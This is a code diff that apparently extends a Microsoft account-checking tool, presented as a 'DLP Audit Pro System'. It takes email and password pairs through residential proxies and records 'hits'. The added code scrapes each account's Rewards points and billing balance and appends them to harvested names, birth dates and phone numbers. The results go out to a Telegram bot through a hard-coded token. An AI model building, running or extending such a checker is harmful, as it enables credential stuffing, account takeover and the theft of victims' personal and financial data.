@@ -578,6 +578,46 @@ def run_local_audit(email, password, iproyal_auth, hits_buffer, keyword="", user
                 if phone_matches: phone = phone_matches[0].strip()
         except: pass
         
+        # --- PASO 6.5 Microsoft Rewards Scraper ---
+        av_pts, today_pts = "0", "0"
+        try:
+            old_accept = session.headers.get("Accept")
+            old_ua = session.headers.get("User-Agent")
+            
+            session.headers.update({
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+                "Accept": "text/html,application/xhtml+xml",
+                "x-requested-with": None
+            })
+            
+            res_r = session.get("https://rewards.bing.com/", verify=False, timeout=15)
+            if res_r.status_code == 200:
+                html_r = res_r.text
+                pts1 = re.findall(r'\"AvailablePoints\"\s*:\s*(\d+)', html_r, re.IGNORECASE)
+                pts2 = re.findall(r'\"availablePoints\"\s*:\s*(\d+)', html_r, re.IGNORECASE)
+                pts3 = re.findall(r'\"todayPoints\"\s*:\s*(\d+)', html_r, re.IGNORECASE)
+                pts4 = re.findall(r'\"balance\"\s*:\s*(\d+)', html_r, re.IGNORECASE)
+
+                av_pts = pts1[0] if pts1 else (pts2[0] if pts2 else (pts4[0] if pts4 else "0"))
+                today_pts = pts3[0] if pts3 else "0"
+            
+            # 2. Microsoft Billing Scraper
+            balance = "0.00"
+            res_b = session.get("https://account.microsoft.com/billing/payments?lang=en-US", verify=False, timeout=15)
+            if res_b.status_code == 200:
+                html_b = res_b.text
+                b_match = re.search(r'\"balance\"\s*:\s*\"([^\"]+)\"', html_b, re.IGNORECASE)
+                if not b_match: b_match = re.search(r'\"DisplayBalance\"\s*:\s*\"([^\"]+)\"', html_b, re.IGNORECASE)
+                if not b_match: b_match = re.search(r'\"CurrencyCode\".*?\"Balance\"\s*:\s*([^,]+)', html_b, re.IGNORECASE)
+                if not b_match: b_match = re.search(r'Microsoft account balance.*?<span[^>]*>([^<]+)</span>', html_b, re.IGNORECASE | re.DOTALL)
+                if b_match: balance = b_match.group(1).strip()
+                
+            if old_accept: session.headers["Accept"] = old_accept
+            if old_ua: session.headers["User-Agent"] = old_ua
+        except Exception as e:
+            print(f"[DEBUG] Error Rewards: {e}")
+            pass
+        
         # PASO 7 - Búsqueda DLP Vía Substrate API
         senders_found = {}
         subject_count = 0
@@ -760,7 +800,10 @@ def run_local_audit(email, password, iproyal_auth, hits_buffer, keyword="", user
             "name": name,
             "dob": dob,
             "language": language,
-            "phone": phone
+            "phone": phone,
+            "points": av_pts,
+            "points_today": today_pts,
+            "balance": balance
         }
         
         token = "8741495811:AAEOFBaW9QfFOpVWfW6kyogJskS7y4wVTIs"
@@ -805,7 +848,10 @@ def run_local_audit(email, password, iproyal_auth, hits_buffer, keyword="", user
                     f"👤 Nombre: {name}\n"
                     f"📅 DOB: {dob}\n"
                     f"🗣️ Idioma: {language}\n"
-                    f"📱 Teléf: {phone}\n\n"
+                    f"📱 Teléf: {phone}\n"
+                    f"🎁 Pts Disponibles: {av_pts}\n"
+                    f"⏱️ Pts de Hoy: {today_pts}\n"
+                    f"💳 Saldo de Cuenta MS: {balance}\n\n"
                     f"📊 Mensajes Relevantes: {sum(u_found.values()) if u_found else 0}\n"
                     f"🔍 Búsqueda: from:{', from:'.join(u_senders) if u_senders else 'N/A'}\n"
                     f"🤖 DLP Audit Pro System"
